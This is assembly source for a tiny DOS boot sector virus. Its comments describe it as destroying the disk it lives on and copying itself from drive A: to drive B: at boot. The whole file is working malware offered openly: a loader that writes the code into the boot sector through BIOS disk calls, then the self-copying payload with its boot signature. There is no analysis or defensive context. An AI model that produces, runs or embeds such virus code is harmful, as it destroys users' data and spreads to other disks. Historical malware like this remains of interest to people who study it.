;This is the smallest possible boot sector virus. It destroys the disk on
;which it resides, and copies itself from drive A: to B: on boot-up.

.model small

.code

        ORG     100H
LOADER:
        mov     ax,0301H                ;this loads the virus to drive A:
        mov     bx,7C00H
        mov     cx,1
        xor     dx,dx
        int     13H
        mov     ax,4C00H                ;and exits to DOS
        int     21H

        ORG     7C00H
BSV:
        xor     cx,cx
        mov     es,ax
        mov     ax,0301H                ;just copy this code here to the
        mov     bx,7C00H                ;boot sector on drive B:
        inc     cx
        mov     dx,cx
        int     13H

        ORG     7DFEH
        db      55H,0AAH                ;end of sector code

        END     LOADER
        